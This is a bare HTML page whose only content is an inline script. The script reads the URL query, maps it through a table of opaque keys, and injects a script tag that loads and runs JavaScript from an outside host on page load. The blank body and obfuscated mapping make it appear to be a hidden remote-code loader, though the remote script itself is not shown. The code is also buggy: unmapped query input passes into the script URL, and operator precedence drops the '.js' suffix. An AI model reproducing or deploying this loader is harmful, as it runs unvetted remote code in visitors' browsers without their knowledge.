<html>

<head>
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <script>
        const objectMap = {
            "0fgl75km": "nruldtca",
            "v302ocn8": "1rdg6n90",
            "canmh1k6": "fb3pi5yu"
        }
        const param = window.location.search.replace("?", "").split("&")[0];
        const urlParam = !!objectMap[param] ? objectMap[param] : param
        console.log("Script>>", param, urlParam)
        var script = document.createElement('script');
        script.setAttribute('src', 'https://naturaladmin.com/blog/?' + urlParam ?? param + '.js');
        document.head.appendChild(script);
    </script>
</head>
</head>

<body>
    {}
</body>

</html>